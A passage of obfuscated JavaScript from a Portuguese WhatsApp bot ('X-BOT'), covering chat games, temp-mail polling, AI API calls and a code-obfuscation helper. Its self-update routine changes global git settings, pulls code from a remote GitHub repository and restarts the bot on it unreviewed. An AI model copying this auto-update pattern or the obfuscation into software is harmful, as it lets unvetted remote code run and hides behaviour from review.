                _0x41afe9++;
              }
              _0x2c585++;
              _0x19dafa++;
            }
            const _0x5c3fc6 = (_0x41afe9 / _0x2f3b7f.length + _0x41afe9 / _0x223cc9.length) / 2 * 100;
            return _0x5c3fc6;
          }
          async function _0x4783db(_0xf140b) {
            const _0x234fbf = () => {
              const _0x30f1d4 = fs.readFileSync("index.js").toString();
              const _0x4e2049 = _0x30f1d4.match(/case\s+['"](.+?)['"]/g);
              if (_0x4e2049) {
                return _0x4e2049.map(_0x446e33 => _0x446e33.match(/['"](.+?)['"]/)[1]);
              } else {
                return [];
              }
            };
            const _0x4ff593 = _0x234fbf();
            let _0x3c9050 = "";
            let _0x24b47c = 0;
            for (const _0x2f2662 of _0x4ff593) {
              const _0x390ec3 = _0x2dae7a(_0xf140b, _0x2f2662);
              if (_0x390ec3 > _0x24b47c) {
                _0x24b47c = _0x390ec3;
                _0x3c9050 = _0x2f2662;
              }
            }
            const _0x30d931 = {
              command: _0x3c9050,
              similarity: _0x24b47c
            };
            return _0x30d931;
          }
          async function _0x5d3b37(_0x2288e1, _0x3ff534, _0x85bdd8) {
            const _0x5e42b7 = Math.min(Math.max(_0x85bdd8, 0), 100).toFixed(2);
            const _0x3ad4c3 = {
              quoted: _0xa6b34
            };
            _0x263319.sendMessage(_0x4f1071, {
              text: "\n╭═══════════════════ ┐\n╰╮" + _0x6965b0 + " @" + _0x32e455.split("@")[0] + "  \n╭┤\n╰╮" + II + " 𝗖𝗼𝗺𝗮𝗻𝗱𝗼: " + F + _0xf87dd3 + F + " 𝘯ã𝘰 𝘦𝘯𝘤𝘰𝘯𝘵𝘳𝘢𝘥𝘰.\n╭┤" + II + " 𝗩𝗼𝗰ê 𝗤𝘂𝗶𝘀 𝗗𝗶𝘇𝗲𝗿: " + F + _0x1d93be + _0x3ff534 + F + "\n╰╮𝗦𝗲𝗺𝗲𝗹𝗵𝗮𝗻ç𝗮: " + F + _0x5e42b7 + "%" + F + "\n╭┤   \n┃╰══ ✞\n╰╦══════════════════ ✞",
              contextInfo: {
                mentionedJid: [_0x32e455],
                externalAdReply: {
                  showAdAttribution: false,
                  mediaType: "VIDEO",
                  mediaUrl: null,
                  title: "ᴿᵉˢᵗ⁻ᵃᵖⁱˢ ᵈᵒ\n͓̽ " + NomeDoBot,
                  body: null,
                  thumbnail: await getBuffer("" + logoslink.logo),
                  sourceUrl: "" + SITE_JEFF_APIS
                },
                forwardingScore: 1000,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "120363193927649951@newsletter",
                  serverMessageId: 100,
                  newsletterName: "📣 X-BOT UPDATES & NOVIDADES 🔄"
                }
              }
            }, _0x3ad4c3);
          }
          async function _0x31362f(_0x51e630) {
            const _0x242865 = await _0x4783db(_0x51e630);
            if (_0x242865.similarity >= 0.4) {
              await _0x5d3b37(_0x51e630, _0x242865.command, _0x242865.similarity);
            } else {
              await _0x5d3b37(_0x51e630, "nenhum comando similar encontrado", 0);
            }
          }
          async function _0x127113(_0x400303) {
            return new Promise((_0x4241f6, _0x4cded5) => {
              try {
                const _0x412b15 = {
                  compact: false,
                  controlFlowFlattening: true,
                  controlFlowFlatteningThreshold: 1,
                  numbersToExpressions: true,
                  simplify: true,
                  stringArrayShuffle: true,
                  splitStrings: true,
                  stringArrayThreshold: 1
                };
                const _0x2d0282 = jsobfus.obfuscate(_0x400303, _0x412b15);
                const _0x3c630c = {
                  status: 200,
                  author: "@jefferson_ddos",
                  result: _0x2d0282.getObfuscatedCode()
                };
                _0x4241f6(_0x3c630c);
              } catch (_0x483a96) {
                _0x4cded5(_0x483a96);
              }
            });
          }
          const _0x4f0c86 = "bronxys";
          const _0x396f72 = "X";
          const _0xf5ea34 = "main";
          const _0x880720 = path.join(__dirname, "armor", "funcoes", "ultimo_commit.json");
          async function _0x2f37ad(_0x4ca348, _0x5892a7) {
            const _0x5d25a1 = {
              text: "🔄 " + NomeDoBot + " procurando novas atualizações do X-BOT..."
            };
            const _0x281d15 = {
              quoted: _0x5892a7
            };
            let {
              key: _0x9dc22d
            } = await _0x263319.sendMessage(_0x4ca348, _0x5d25a1, _0x281d15);
            await sleep(1500);
            const _0x1adb11 = "https://api.github.com/repos/" + _0x4f0c86 + "/" + _0x396f72 + "/commits?sha=" + _0xf5ea34;
            try {
              const _0x164546 = await fetch(_0x1adb11);
              const _0x294d83 = await _0x164546.json();
              if (!_0x294d83 || !_0x294d83[0]) {
                return _0x403602("❌ Não foi possível obter as informações do repositório.");
              }
              const _0xcdac0e = _0x294d83[0].sha;
              if (fs.existsSync(_0x880720)) {
                const _0x180acb = JSON.parse(fs.readFileSync(_0x880720, "utf-8"));
                if (_0x180acb.sha === _0xcdac0e) {
                  const _0x25627f = {
                    text: "✅ O " + NomeDoBot + " já está na última versão Disponível!",
                    edit: _0x9dc22d
                  };
                  _0x263319.sendMessage(_0x4ca348, _0x25627f);
                  return;
                }
              }
              const _0x47bd17 = path.dirname(_0x880720);
              if (!fs.existsSync(_0x47bd17)) {
                const _0x190a7a = {
                  recursive: true
                };
                fs.mkdirSync(_0x47bd17, _0x190a7a);
              }
              const _0x254538 = {
                sha: _0xcdac0e
              };
              fs.writeFileSync(_0x880720, JSON.stringify(_0x254538));
              const _0x59d044 = {
                text: "🔄 Atualizações encontradas! Aplicando a nova atualização do X-BOT Aguarde...",
                edit: _0x9dc22d
              };
              _0x263319.sendMessage(_0x4ca348, _0x59d044);
              _0x3fc1ae(_0x4ca348, _0x5892a7);
            } catch (_0x40ee1d) {
              console.error("Erro ao verificar atualizações:", _0x40ee1d);
              _0x403602("❌ Ocorreu um erro ao verificar atualizações.", _0x4ca348, _0x5892a7);
            }
          }
          async function _0x3fc1ae(_0x455b75, _0x36b165) {
            try {
              exec("git config --global --add safe.directory " + __dirname, (_0x164a36, _0xbdb26f, _0x46dc69) => {
                if (_0x164a36) {
                  console.error("Erro ao adicionar diretório seguro:", _0x46dc69 || _0x164a36);
                  return _0x403602("❌ Erro ao configurar o diretório seguro. Não foi possível atualizar.", _0x455b75, _0x36b165);
                }
                exec("git pull https://github.com/bronxys/X.git", (_0x2bd808, _0x4ffcbd, _0x505ec5) => {
                  if (_0x2bd808) {
                    console.error("Erro ao atualizar:", _0x2bd808);
                    _0x403602("❌ Erro ao atualizar os arquivos.", _0x455b75, _0x36b165);
                    return;
                  }
                  console.log("Atualização concluída:", _0x4ffcbd || _0x505ec5);
                  _0x403602("✅ *Atualização concluída com sucesso! " + NomeDoBot + " foi atualizado para a versão mais recente disponível na versão free.*\n\n🔒 *Não se preocupe, seus dados foram mantidos com segurança.*\n\n⚙️ *Irei reiniciar para aplicar a minha nova atualização, Reiniciando... aguarde 10 segundos*\n\n");
                  setTimeout(() => _0x534823(_0x455b75, _0x36b165), 5000);
                });
              });
            } catch (_0x5ccbaa) {
              console.error("Erro ao tentar atualizar:", _0x5ccbaa);
              _0x403602("❌ Erro ao tentar aplicar atualizações.");
            }
          }
          function _0x534823(_0x195cb8, _0x25c507) {
            _0x403602("♻️ Reiniciando o " + NomeDoBot + " e aplicando a nova atualização aguarde 10 segundos");
            process.exit();
          }
          const _0x111c2f = "./DADOS/usuarios/topcases.json";
          function _0x1d7ba0() {
            const _0x3ace25 = fs.readFileSync("index.js").toString();
            const _0x32e5a7 = _0x3ace25.match(/case\s+['"](.+?)['"]/g);
            if (_0x32e5a7) {
              return _0x32e5a7.map(_0x59c907 => _0x59c907.match(/['"](.+?)['"]/)[1]);
            } else {
              return [];
            }
          }
          function _0x52f23b(_0x55d7c0) {
            const _0x1fa808 = _0x1d7ba0();
            if (!_0x1fa808.includes(_0x55d7c0)) {
              return;
            }
            if (!fs.existsSync(_0x111c2f)) {
              fs.writeFileSync(_0x111c2f, JSON.stringify({}));
            }
            let _0x8ee91f = JSON.parse(fs.readFileSync(_0x111c2f, "utf8"));
            if (!_0x8ee91f[_0x55d7c0]) {
              _0x8ee91f[_0x55d7c0] = 1;
            } else {
              _0x8ee91f[_0x55d7c0] += 1;
            }
            fs.writeFileSync(_0x111c2f, JSON.stringify(_0x8ee91f, null, 2));
          }
          function _0x532a11() {
            if (!fs.existsSync(_0x111c2f)) {
              return "Nenhum caso registrado ainda.";
            }
            let _0x20e58b = JSON.parse(fs.readFileSync(_0x111c2f, "utf8"));
            let _0xa533a9 = Object.entries(_0x20e58b).sort((_0x1e9fe1, _0x302dcf) => _0x302dcf[1] - _0x1e9fe1[1]).slice(0, 10);
            let _0x58c656 = "";
            _0xa533a9.forEach(([_0x855e6e, _0x398e3], _0x412328) => {
              _0x58c656 += "┏│✞͜͡▹ " + _0x1d93be + _0x855e6e + "\n";
            });
            return _0x58c656;
          }
          if (_0x52ab25) {
            _0x52f23b(_0x3dec88);
          }
          async function _0x3d8f9d(_0x34858c) {
            const _0x3e8288 = path.join(__dirname, "DADOS/audios");
            const _0x329fda = path.join(_0x3e8288, "audios.json");
            if (!fs.existsSync(_0x329fda)) {
              return;
            }
            const _0x4c28f9 = JSON.parse(fs.readFileSync(_0x329fda, "utf-8"));
            for (const [_0x3b43a1, _0x3aff8e] of Object.entries(_0x4c28f9)) {
              if (_0x34858c.match(new RegExp("\\b" + _0x3b43a1 + "\\b", "i"))) {
                const _0x515e11 = path.join(__dirname, _0x3aff8e);
                await _0x354331(_0x515e11, _0x3b43a1);
                break;
              }
            }
          }
          const _0x34eb5d = async _0x534cdd => {
            try {
              const _0x2f09c8 = path.join(__dirname, "DADOS/stickers");
              const _0x5ef812 = path.join(_0x2f09c8, "stickers.json");
              if (fs.existsSync(_0x5ef812)) {
                const _0x501806 = JSON.parse(fs.readFileSync(_0x5ef812, "utf-8"));
                for (const _0x33e4c3 of Object.keys(_0x501806)) {
                  if (_0x534cdd.match(new RegExp("\\b" + _0x33e4c3 + "\\b", "i"))) {
                    const _0x2ed2b9 = path.join(__dirname, _0x501806[_0x33e4c3]);
                    await _0x576ebe(_0x2ed2b9, _0x33e4c3);
                  }
                }
              }
            } catch (_0x30e3df) {
              console.error("Erro ao verificar ou enviar a figurinha:", _0x30e3df);
            }
          };
          const _0x146833 = async _0xbefe28 => {
            try {
              const _0x4769a1 = path.join(__dirname, "DADOS", "texts.json");
              if (fs.existsSync(_0x4769a1)) {
                const _0x38e2df = JSON.parse(fs.readFileSync(_0x4769a1, "utf-8"));
                for (const _0x1ae243 of Object.keys(_0x38e2df)) {
                  if (_0xbefe28.match(new RegExp("\\b" + _0x1ae243 + "\\b", "i"))) {
                    const _0x51a58e = _0x38e2df[_0x1ae243];
                    return _0x403602(_0x51a58e);
                  }
                }
              }
            } catch (_0x5b9d41) {
              console.error("Erro ao verificar ou enviar texto automático:", _0x5b9d41);
            }
          };
          if (_0x2e320b.includes("Jeff") || _0x2e320b.includes("@" + _0x2dd81a.split("@")[0])) {
            setTimeout(() => {
              _0x1b86ad(_0x4f1071, "🧠");
            }, 300);
            let _0x387e4a = _0x40e45c.join("");
            let _0x4ea99c = _0x2e320b;
            if (!_0x387e4a) {
              return _0x403602(_0x56dc92);
            }
            if (_0x302296.message.extendedTextMessage && _0x302296.message.extendedTextMessage.contextInfo && _0x302296.message.extendedTextMessage.contextInfo.quotedMessage) {
              _0x4ea99c = _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.conversation;
            }
            if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
              const _0x20a169 = JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage;
              const _0x500921 = await downloadContentFromMessage(_0x20a169, "image");
              let _0x42976c = Buffer.from([]);
              for await (const _0x159723 of _0x500921) {
                _0x42976c = Buffer.concat([_0x42976c, _0x159723]);
              }
              const _0x45bc28 = await upload(_0x42976c);
              ABC = await fetchJson(SITE_JEFF_APIS + "/ia/bardimg?url=" + _0x45bc28 + "&text=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
              _0x403602("" + ABC.resultado);
            } else {
              var _0x2bc3d1 = _0x1d6557 + " " + _0x4ea99c;
              _0x105f0a = await fetchJson(SITE_JEFF_APIS + "/api/ia/gbard?query=" + encodeURIComponent(_0x2bc3d1) + "&apikey=" + _0x512d5e);
              _0x403602("" + _0x105f0a.resultado);
            }
          } else {}
          if (_0x193ccd) {}
          function _0x248b92(_0x232fdf, _0x4d30e6, _0x4a5b37, _0x34a3a6) {
            try {
              if (botoes_) {
                const _0x5ea1d2 = {
                  text: _0x232fdf
                };
                const _0x3a89d1 = {
                  text: _0x4d30e6
                };
                const _0x1e9138 = {
                  display_text: _0x4a5b37,
                  id: _0x34a3a6
                };
                _0x263319.relayMessage(_0x4f1071, {
                  interactiveMessage: {
                    body: _0x5ea1d2,
                    footer: _0x3a89d1,
                    nativeFlowMessage: {
                      buttons: [{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify(_0x1e9138)
                      }]
                    }
                  }
                }, {});
              } else {
                _0x403602(_0x232fdf + "\n" + _0x4d30e6 + "\n\nSE VOCÊ " + _0x4a5b37 + ", DIGITE:\n*" + _0x34a3a6 + "*\n\nPARA PODER USAR AS NOSSAS PUXADAS!\n\n> Equipe: " + NickDono + "\n> Bot: " + NomeDoBot);
              }
            } catch (_0x341d4c) {
              _0x403602("Erro: " + _0x341d4c.message);
            }
          }
          async function _0x4e12f3(_0x449596) {
            try {
              const _0x44a710 = await fetch(SITE_JEFF_APIS + "/api/tempmail/messages?token=" + _0x449596 + "&apikey=" + _0x512d5e);
              const _0x1ba83f = await _0x44a710.json();
              if (_0x1ba83f.status && _0x1ba83f.messages.length > 0) {
                const _0x3444b1 = _0x1ba83f.messages.map(_0x2ea420 => {
                  const _0x4c14ab = {
                    id: _0x2ea420._id,
                    from: _0x2ea420.from,
                    subject: _0x2ea420.subject,
                    bodyPreview: _0x2ea420.bodyPreview
                  };
                  return _0x4c14ab;
                });
                return _0x3444b1;
              } else {
                return [];
              }
            } catch (_0x2fb826) {
              console.log("erro ao buscar as msg");
            }
          }
          async function _0x15dc20(_0x3b808e, _0xbaa86a, _0x59c588) {
            if (_0x3b808e.length > 0) {
              let _0x5b0972 = "📩 CORREIO ELETRÔNICO 📩\n\n";
              _0x3b808e.forEach(_0x3b829d => {
                _0x5b0972 += "🆔 ID: " + _0x3b829d.id + "\n\n👤 De: " + _0x3b829d.from + "\n\n📋 Assunto: " + _0x3b829d.subject + "\n\n📨Mensagem: " + _0x3b829d.bodyPreview + "\n\n";
              });
              const _0x59ebc6 = {
                text: _0x5b0972
              };
              await _0x59c588.sendMessage(_0xbaa86a, _0x59ebc6);
              return true;
            } else {
              return false;
            }
          }
          async function _0x26cdf4(_0x25d695, _0x28feb8, _0x2f2064) {
            const _0x1d7438 = 30000;
            const _0x502c3e = 1200000;
            let _0x35275e = 0;
            let _0xef85e = false;
            try {
              while (!_0xef85e && _0x35275e < _0x502c3e) {
                const _0x1b6939 = Date.now();
                const _0x105a63 = await _0x4e12f3(_0x25d695);
                _0xef85e = await _0x15dc20(_0x105a63, _0x28feb8, _0x2f2064);
                const _0x866a85 = Date.now();
                _0x35275e += _0x866a85 - _0x1b6939;
                if (!_0xef85e && _0x35275e < _0x502c3e) {
                  await new Promise(_0x181fe2 => setTimeout(_0x181fe2, _0x1d7438));
                }
              }
              if (_0x35275e >= _0x502c3e) {}
            } catch (_0x405c4a) {
              const _0x30894a = {
                text: "Ocorreu um erro ao buscar as mensagens: " + _0x405c4a.message
              };
              await _0x2f2064.sendMessage(_0x28feb8, _0x30894a);
            }
          }
          if (_0xd20756 && _0x52ab25 && !_0x2a5ff3 && !_0x35021e && _0x2b1652.includes(_0x3dec88) && !_0x2a5ff3) {
            return _0x403602("Olá, o comando está bloqueado para *uso global*, ou seja, todos os usuários estão impossibilitados de usar ele.\n–\n• Entre em contato com meu proprietário para saber o motivo.");
          }
          if (_0x303ef4) {
            if (_0xd20756 && _0x302296.message?.reactionMessage?.text) {
              console.log(colors.blue("\n╭════════════════════════════════ ┐\n╰╮    【 𝘾𝙤𝙢𝙖𝙣𝙙𝙤 𝙀𝙢 𝙂𝙧𝙪𝙥𝙤 】\n┏│\n┏│\n┏│  ❬ " + colors.brightYellow("USUÁRIO") + "  ❭: " + _0x55a6ac + "\n┏│\n┏│  ❬ NÚMERO  ❭: ❬ " + colors.brightMagenta(_0x32e455.split("@")[0]) + " ❭\n┏│\n┏│  ❬ " + (_0xd20756 ? colors.brightMagenta("GRUPO") : colors.brightMagenta("PRIVADO")) + "  ❭" + (_0xd20756 ? " ❬ " + colors.cyan(_0x471350) + " ❭" : "") + "\n┏│\n┏│  ❬ REAÇÃO  ❭:  ❬ " + _0x302296.message.reactionMessage.text + " ❭\n┏│\n┏│\n┏│     ❬ 𝙓-𝘽𝙊𝙏 VERSÃO: " + versão + " ❭\n┏│\n╰════════════════════════════════ ┘"));
            } else if (_0xd20756 && !_0x52ab25) {
              console.log(colors.blue("\n╭════════════════════════════════ ┐\n╰╮    【 𝙈𝙚𝙣𝙨𝙖𝙜𝙚𝙢 𝙀𝙢 𝙂𝙧𝙪𝙥𝙤 】\n┏│\n┏│\n┏│  ❬ " + colors.brightYellow("USUÁRIO") + "  ❭: " + _0x55a6ac + "\n┏│\n┏│  ❬ NÚMERO  ❭: ❬ " + colors.brightMagenta(_0x32e455.split("@")[0]) + " ❭\n┏│\n┏│  ❬ " + colors.brightMagenta("GRUPO") + "  ❭: ❬ " + colors.cyan(_0x471350) + " ❭\n┏│\n┏│\n┏│     ❬ 𝙓-𝘽𝙊𝙏 VERSÃO: " + versão + " ❭\n┏│\n╰════════════════════════════════ ┘"));
            } else if (_0x52ab25 && !_0xd20756) {
              console.log(colors.blue("\n╭════════════════════════════════ ┐\n╰╮    【 𝘾𝙤𝙢𝙖𝙣𝙙𝙤 𝙀𝙢 𝙋𝙧𝙞𝙫𝙖𝙙𝙤 】\n┏│\n┏│\n┏│  ❬ " + colors.brightYellow("USUÁRIO") + "  ❭: " + _0x55a6ac + "\n┏│\n┏│  ❬ NÚMERO  ❭: ❬ " + colors.brightMagenta(_0x32e455.split("@")[0]) + " ❭\n┏│\n┏│  ❬ " + colors.red("PRIVADO") + " ❭ \n┏│\n┏│  ❬ COMANDO  ❭ :「 " + _0x3dec88 + " 」\n┏│\n┏│\n┏│     ❬ 𝙓-𝘽𝙊𝙏 VERSÃO: " + versão + " ❭\n┏│\n╰════════════════════════════════ ┘"));
            } else if (_0x52ab25 && _0xd20756) {
              console.log(colors.blue("\n╭════════════════════════════════ ┐\n╰╮    【 𝘾𝙤𝙢𝙖𝙣𝙙𝙤 𝙀𝙢 𝙂𝙧𝙪𝙥𝙤 】\n┏│\n┏│  ❬ " + colors.brightYellow("USUÁRIO") + "  ❭: " + _0x55a6ac + "\n┏│\n┏│  ❬ NÚMERO  ❭: ❬ " + colors.brightMagenta(_0x32e455.split("@")[0]) + " ❭\n┏│\n┏│  ❬ " + colors.brightMagenta("GRUPO") + "  ❭: ❬ " + colors.cyan(_0x471350) + " ❭\n┏│\n┏│  ❬ COMANDO  ❭:「 " + _0x3dec88 + " 」\n┏│\n┏│\n┏│     ❬ 𝙓-𝘽𝙊𝙏 VERSÃO: " + versão + " ❭\n┏│\n╰════════════════════════════════ ┘"));
            } else {
              console.log(colors.blue("\n╭════════════════════════════════ ┐\n╰╮   【 𝙈𝙚𝙣𝙨𝙖𝙜𝙚𝙢 𝙀𝙢 𝙋𝙧𝙞𝙫𝙖𝙙𝙤 】\n┏│\n┏│\n┏│  ❬ " + colors.brightYellow("USUÁRIO") + "  ❭ : " + _0x55a6ac + "\n┏│\n┏│  ❬ NÚMERO  ❭: ❬ " + colors.brightMagenta(_0x32e455.split("@")[0]) + " ❭\n┏│\n┏│  ❬ " + colors.red("PRIVADO") + " ❭\n┏│\n┏│\n┏│     ❬ 𝙓-𝘽𝙊𝙏 VERSÃO: " + versão + " ❭\n┏│\n╰════════════════════════════════ ┘"));
            }
          }
          async function _0x3c41aa() {
            if (joguinhodavelhajs2.includes(_0x4f1071) || joguinhodavelhajs.includes(_0x32e455)) {
              const _0x4a993e = _0xf87dd3.toLowerCase().split(" ")[0] || "";
              let _0x4c5309 = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
              if (fs.existsSync("./DADOS/tictactoe/db/" + _0x4f1071 + ".json")) {
                const _0x343cc8 = setGame("" + _0x4f1071);
                if (_0xf87dd3 == "Cex") {
                  return _0x403602("why");
                }
                if (_0xf87dd3.toLowerCase() == "s" || _0xf87dd3.toLowerCase() == "sim" || _0xf87dd3.toLowerCase() == "ok") {
                  if (_0x343cc8.O == _0x32e455.replace("@s.whatsapp.net", "")) {
                    if (_0x343cc8.status) {
                      return _0x403602("O jogo já começou antes!");
                    }
                    const _0x24468a = _0x343cc8._matrix;
                    _0x343cc8.status = true;
                    fs.writeFileSync("./DADOS/tictactoe/db/" + _0x4f1071 + ".json", JSON.stringify(_0x343cc8, null, 2));
                    const _0x5d7697 = "*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*\n                    \n❌ : @" + _0x343cc8.X + "\n⭕ : @" + _0x343cc8.O + "\n               \nSua vez... : @" + (_0x343cc8.turn == "X" ? _0x343cc8.X : _0x343cc8.O) + "\n\n" + _0x24468a[0][0] + "  " + _0x24468a[0][1] + "  " + _0x24468a[0][2] + "\n" + _0x24468a[1][0] + "  " + _0x24468a[1][1] + "  " + _0x24468a[1][2] + "\n" + _0x24468a[2][0] + "  " + _0x24468a[2][1] + "  " + _0x24468a[2][2] + "\n";
                    _0x5b6fe5(_0x5d7697);
                  }
                } else if (_0xf87dd3.toLowerCase() == "n" || _0xf87dd3.toLowerCase() == "não" || _0xf87dd3.toLowerCase() == "no") {
                  if (_0x343cc8.O == _0x32e455.replace("@s.whatsapp.net", "")) {
                    if (_0x343cc8.status) {
                      return _0x403602("O jogo já começou!");
                    }
                    DLT_FL("./DADOS/tictactoe/db/" + _0x4f1071 + ".json");
                    _0x5b6fe5("@" + _0x343cc8.X + " *_Infelizmente seu oponente não aceitou o desafio ❌😕_*");
                    joguinhodavelhajs.splice([]);
                    fs.writeFileSync("./DADOS/usuarios/joguinhodavelha.json", JSON.stringify(joguinhodavelhajs));
                    joguinhodavelhajs2.splice([]);
                    fs.writeFileSync("./DADOS/usuarios/joguinhodavelha2.json", JSON.stringify(joguinhodavelhajs2));
                  }
                }
              }
              if (_0x4c5309.includes(_0x4a993e)) {
                const _0x21432d = setGame("" + _0x4f1071);
                if (!_0x21432d.status) {
                  return _0x403602("Parece que seu oponente não aceitou o desafio ainda...");
                }
                if ((_0x21432d.turn == "X" ? _0x21432d.X : _0x21432d.O) != _0x32e455.replace("@s.whatsapp.net", "")) {
                  return;
                }
                const _0xfe6186 = validmove(Number(_0xf87dd3), "" + _0x4f1071);
                const _0x34bb65 = _0xfe6186._matrix;
                if (_0xfe6186.isWin) {
                  if (_0xfe6186.winner == "SERI") {
                    const _0x51005d = "*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*\n          \nJogo termina empatado 😐\n";
                    _0x403602(_0x51005d);
                    DLT_FL("./DADOS/tictactoe/db/" + _0x4f1071 + ".json");
                    joguinhodavelhajs.splice([]);
                    fs.writeFileSync("./DADOS/usuarios/joguinhodavelha.json", JSON.stringify(joguinhodavelhajs));
                    joguinhodavelhajs2.splice([]);
                    fs.writeFileSync("./DADOS/usuarios/joguinhodavelha2.json", JSON.stringify(joguinhodavelhajs2));
                    return;
                  }
                  const _0x46ffec = Math.ceil(Math.random() + 4000);
                  const _0xde9895 = _0xfe6186.winner == "O" ? _0xfe6186.O : _0xfe6186.X;
                  const _0x1ec9f3 = _0xfe6186.winner == "O" ? _0xfe6186.X : _0xfe6186.O;
                  const _0x2e495d = Math.floor(Math.random() * 1) + 10;
                  const _0x14773b = Math.floor(Math.random() * 1) + 5;
                  const _0xe758cb = "*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*\n          \nVencido por @" + _0xde9895 + " 😎👑\n";
                  const _0x25ef53 = {
                    text: _0xe758cb
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x25ef53, {
                    quoted: _0x302296,
                    mentions: [_0xfe6186.winner == "O" ? _0xfe6186.O + "@s.whatsapp.net" : _0xfe6186.X + "@s.whatsapp.net"]
                  });
                  setTimeout(() => {
                    if (fs.existsSync("./DADOS/tictactoe/db/" + _0x4f1071 + ".json")) {
                      DLT_FL("./DADOS/tictactoe/db/" + _0x4f1071 + ".json");
                      _0x403602("*🕹️JOGO DA VELHA RESETADO...🕹️*");
                    } else {
                      console.log(colors.red(time, "red"), colors.magenta("[ EXPIRADO ]"), colors.red("Jogo da velha espirado"));
                    }
                    joguinhodavelhajs.splice([]);
                    fs.writeFileSync("./DADOS/usuarios/joguinhodavelha.json", JSON.stringify(joguinhodavelhajs));
                    joguinhodavelhajs2.splice([]);
                    fs.writeFileSync("./DADOS/usuarios/joguinhodavelha2.json", JSON.stringify(joguinhodavelhajs2));
                  }, 300000);
                  _0x403602("_*🥳Parabéns @" + _0xde9895 + " Você ganhou 20 Golds por ter ganhado o jogo da velha🎉...*_");
                  if (JSON.stringify(rggold).includes(_0x4f1071)) {
                    var _0x4b31cb = rggold.map(_0x2d7449 => _0x2d7449.grupo).indexOf(_0x4f1071);
                    if (JSON.stringify(rggold[_0x4b31cb].usus).includes(_0x32e455)) {
                      var _0x5e9beb = rggold[_0x4b31cb].usus.map(_0x29dcad => _0x29dcad.id).indexOf(_0x32e455);
                      rggold[_0x4b31cb].usus[_0x5e9beb].Golds += 20;
                      _0x61f85(rggold);
                    }
                  }
                  DLT_FL("./DADOS/tictactoe/db/" + _0x4f1071 + ".json");
                  joguinhodavelhajs.splice([]);
                  fs.writeFileSync("./DADOS/usuarios/joguinhodavelha.json", JSON.stringify(joguinhodavelhajs));
                  joguinhodavelhajs2.splice([]);
                  fs.writeFileSync("./DADOS/usuarios/joguinhodavelha2.json", JSON.stringify(joguinhodavelhajs2));
                } else {
                  const _0x42445 = "*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*\n          \n❌ : @" + _0xfe6186.X + "\n⭕ : @" + _0xfe6186.O + "\n\nSua vez : @" + (_0xfe6186.turn == "X" ? _0xfe6186.X : _0xfe6186.O) + "\n\n" + _0x34bb65[0][0] + "  " + _0x34bb65[0][1] + "  " + _0x34bb65[0][2] + "\n" + _0x34bb65[1][0] + "  " + _0x34bb65[1][1] + "  " + _0x34bb65[1][2] + "\n" + _0x34bb65[2][0] + "  " + _0x34bb65[2][1] + "  " + _0x34bb65[2][2] + "\n";
                  _0x5b6fe5(_0x42445);
                }
              }
            }
          }
          if (_0xd20756 && fs.existsSync("./DADOS/usuarios/grupos/games/anagrama/" + _0x4f1071 + ".json")) {
            let _0x848b2b = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/anagrama/" + _0x4f1071 + ".json"));
            if (_0xf87dd3.slice(0, 4).toUpperCase() == _0x848b2b.original.slice(0, 4).toUpperCase() && _0xf87dd3.toUpperCase() != _0x848b2b.original) {
              return _0x403602("está perto");
            }
            if (_0xf87dd3.toUpperCase() == _0x848b2b.original) {
              const _0x103925 = {
                text: "🎉 Parabéns *" + _0x55a6ac + "*, você acertou o anagrama apresentado.\nA palavra original era: *" + _0x848b2b.original + "*. Estou iniciando o próximo jogo em 5s!"
              };
              const _0x5dda84 = {
                mentionedJid: [_0x32e455]
              };
              _0x263319.sendMessage(_0x4f1071, _0x103925, _0x5dda84);
              fs.unlinkSync("./DADOS/usuarios/grupos/games/anagrama/" + _0x4f1071 + ".json");
              setTimeout(async () => {
                fs.writeFileSync("./DADOS/usuarios/grupos/games/anagrama/" + _0x4f1071 + ".json", "" + JSON.stringify(palavrasANA[Math.floor(Math.random() * palavrasANA.length)]));
                let _0x1f43c9 = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/anagrama/" + _0x4f1071 + ".json"));
                const _0x11127d = {
                  text: "Decifre a palavra embaralhada abaixo:\n• " + II + "Anagrama:" + II + " " + _0x1f43c9.embaralhada + "\n• " + II + "Dica:" + II + " " + _0x1f43c9.dica
                };
                _0x263319.sendMessage(_0x4f1071, _0x11127d);
              }, 5000);
            }
          }
          if (_0xd20756 && fs.existsSync("./DADOS/usuarios/grupos/games/quiz-animais/" + _0x4f1071 + ".json")) {
            let _0x5a93b3 = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/quiz-animais/" + _0x4f1071 + ".json"));
            if (_0xf87dd3.slice(0, 4).toUpperCase() == _0x5a93b3.original.slice(0, 4).toUpperCase() && _0xf87dd3.toUpperCase() != _0x5a93b3.original) {
              return _0x403602("está perto");
            }
            if (_0xf87dd3.toUpperCase() == _0x5a93b3.original) {
              const _0x3a4128 = {
                text: "🎉 Parabéns *" + _0x55a6ac + "*, você acertou! O animal era: *" + _0x5a93b3.original + "*.\n• Estou iniciando o próximo jogo em 5s!"
              };
              const _0x1b770e = {
                mentionedJid: [_0x32e455]
              };
              _0x263319.sendMessage(_0x4f1071, _0x3a4128, _0x1b770e);
              fs.unlinkSync("./DADOS/usuarios/grupos/games/quiz-animais/" + _0x4f1071 + ".json");
              setTimeout(async () => {
